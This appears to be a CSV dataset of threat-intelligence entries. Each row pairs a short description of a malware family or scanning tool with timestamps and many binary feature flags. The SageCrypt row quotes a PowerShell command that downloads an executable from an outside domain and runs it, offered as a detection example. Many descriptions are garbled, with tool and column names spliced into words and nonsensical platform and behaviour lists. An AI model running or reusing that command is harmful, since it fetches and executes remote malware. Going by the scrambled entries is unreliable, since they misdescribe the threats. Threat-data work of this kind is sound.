"description","created","modified","adversary","name","js","html","doc","iframe","script","php","vbscripts","downloader","dropper","crypt","exploit","riskware","malware","trojan","injector","redirector","virus","android","autorun","fake","spy","adware","phish","hidelink","stealer","java","pdf","blackhole","backdoor","unix","linux","rootkit","sms","bundle","packed","toolbar","worm","hack","ransom","keylogger","perl","joke","crack","camubot","brazil","ibm","mirai","sonicwall","gafgyt","table","ddos","apache","code","huawei","dlink","zyxel","unit42","vbscript","first","reactor","smokeloader","banker","anubis","mobile","sophos","Underminer","Bootkit","cryptominer","trendmicro","china","APAC","Gh0st","Dnstunserver","NBDDOS","GTalkTrojan","AspxSpy","GSecDump","QuarksPwDump","HTran","sofacy","nato","zebrocy","gamefish","apt28","xagent","delphi","ukraine","coreshell","asia","apt","kaspersky","plugx","office","windows","ssl","fireeye","carbanak","vnc","mimikatz","word","pos","trustwave","msword","osx","proxy","p2p","client","hijacker","russia","africa","PinchDuke","GeminiDuke","CosmicDuke","MiniDuke","CozyDuke","OnionDuke","SeaDuke","HammerDuke","CloudDuke","emissary","jakarta","dealerschoice","flash","ukrainian","mac","komplex","cmstar","bbsrat","mongolian","mongolia","military","url","xor","uzbekistan","government","russian","ics","industrial","spearphishing","FareIT","pony","HawkEye","recon","scan","scanning","port","automated","reconnaissance","range","search","test","fuzzing","nmap","portmap","service","ip","domain","info","osr","attempt","web","access","webscrape","scraping","scrape","fuzz","webscraper","gathering","fileDownload","openSource","infoGathering","triage","webserver","bruteforce","guess","passwordGuess","ipScan","portScan","portScanner","solarWinds","acas","angryIp","netcat","openVas","nessus","coreImpact","qualys","nikto","dnswalk","dirWalk","webscan","p0f","wireshark","classInfo"
"Allaple-f malware has shown the following behaviors: worm,hack,trojan,virus ; Allaple-f malware has targeted following platforms: win32 ;","2/12/2018 1:10","2/19/2018 1:56","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1"
"Androm malware has shown the following behaviors: backdoor,spy,trojan,riskware,ransom ; Androm malware has targeted following platforms: win32,win,proxy,vbscripts,win64 ; Androm malware  has used the following delivery mechanisms: autorun,dropper,downloader,bundle,packed ;","12/14/2018 0:59","12/10/2018 21:44","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","1","1","1","1","1","1","1","1","1","0","1","0","1","0","1","1","0","0","1","0","0","0","1","0","0","0","0","1","1","0","1","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1"
"Urelas infoGathering has shown the following behaviors: passscanGuess,webserver,nikto,infoGathering,nikto ; Urelas infoGathering has targeted following platforms: win32 ; Urelas infoGathering  has used the following delivery mechaniwireshark: webscrape ;","7/10/2017 16:24","7/24/2017 19:55","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0"
"SageCrypt scans, often poorly detected at the network level due to the usage of LetsEntriage certificates. These are detected within Alienvault USM by looking for Excel launching Cmd.exe.

Example download via Powershell:
pOwERShell.exe -nOl -NoNiNt -WInDOws 1 -NoprOFIle -eXEcu BYpaSs (new-object system.net.webportScanner).

downloadfile(https://cedacriall.faith/1aqalpiniahelfuimoksa.exe,%APPDATA%\exe);start-process %APPDATA%\exe","6/26/2018 22:10","6/21/2018 22:41","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","1","1","0","1","0","1","0","0","1","0","0","0","1","1","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","1","0","1","1","1","1","0","0","0","0","0","1","1","0","0","0","1","0","0","0"
"Production malware has shown the following behaviors: adware,riskware,backdoor,injector,malware ; Production malware has targeted following platforms: android,win32,vbscripts ; Production malware  has used the following delivery mechanisms: autorun,dropper,packed ;","7/17/2018 22:43","7/15/2018 22:26","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","1","0","1","0","1","1","1","1","1","0","1","1","1","0","0","1","0","0","0","0","0","0","1","0","0","0","1","0","1","1","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1"
"Shellsearch portScanner has shown the following behaviors: ip,test,portScanner,recon,p0f ; Shellsearch portScanner has targeted following platforms: attempt,vbwebscrapers,win32,access,qualys ; Shellsearch portScanner  has used the following delivery mechaniwebserver: attempt ;","7/28/2018 0:58","7/18/2018 21:40","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","0","0","0","0","0","1","0","1","1","1","0","1","0","1","0","0","0","0","1","1","1","0","0","0","0","0","0","1","0","0","1","0","0","0","0","0","1","1","1","0","0","0","0","1","0"
"Grayware test has shown the following behaviors: scan,access,scan,dirWalk,netcat ; Grayware test has targeted following platforms: win32,openVas,win,webserver,guess ; Grayware test  has used the following delivery mechaniinfoGathering: nmap,scan,openVas,webscrape,automated ;","12/14/2018 20:43","12/7/2018 1:38","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","1","0","0","0","1","1","1","0","1","0","0","0","0","1","0","0","0","0","0","0","1","1","0","0","1","0","0","0","1","1","0","1","0","1","0","0","0","0"
"E996265a malware has shown the following behaviors: trojan,crypt ; E996265a malware has targeted following platforms: js,html ;","10/4/2018 0:31","10/2/2018 3:55","197dd5f4-db34-4ed2-87f8-653458b33e7d","","1","1","0","0","0","0","0","0","0","1","0","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1"
"Nap qualys has shown the following behaviors: fileDownload,qualys,portScanner ; Nap qualys has targeted following platforms: service,nessus,dnswalk,openVas ; Nap qualys  has used the following delivery mechanirecon: solarWinds,test ;","10/16/2018 1:33","10/10/2018 3:53","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","1","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","1","0","0","0","0","0","0","0","0"
"Pipe malware has shown the following behaviors: backdoor,trojan,adware,crypt,exploit ; Pipe malware has targeted following platforms: js,win32,html,android,osx ; Pipe malware  has used the following delivery mechanisms: downloader,phish,autorun,packed,dropper ;","7/25/2018 1:41","8/8/2018 4:24","197dd5f4-db34-4ed2-87f8-653458b33e7d","","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","1","0","1","1","1","1","0","1","0","1","1","1","1","1","1","1","1","0","1","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","1","1","0","1","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1"
"Nba malware has shown the following behaviors: trojan,virus,riskware,malware,worm ; Nba malware has targeted following platforms: win32,vbscripts ; Nba malware  has used the following delivery mechanisms: dropper,downloader ;","1/22/2018 23:23","1/23/2018 21:22","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","1","1","1","0","0","1","1","1","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1"
"Ipamor port has shown the following behaviors: fuzz,infoGathering,nessus ; Ipamor port has targeted following platforms: bruteforce,win32 ;","6/10/2018 14:13","6/1/2018 14:18","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","1","0","0","0","0","0","1","0","0","0","0","1","0","0","0","0","0","0","0","0","1","0","0","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0"
"Hzuf ipScan has shown the following behaviors: dnswalk,gathering ; Hzuf ipScan has targeted following platforms: msaccess,win32,passaccessGuess ;","1/10/2018 1:13","1/20/2018 17:36","197dd5f4-db34-4ed2-87f8-653458b33e7d","","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","0","1","0","1","0","0","0","0","0","1","1","0","0","1","0","0","0","0","0","0","0","0","0","0","0","0","0","1","1","0","0","0","0","0","1","0","0","0","0","1","0","1","0","0","1","0","0","1","0","0","0","0","0"
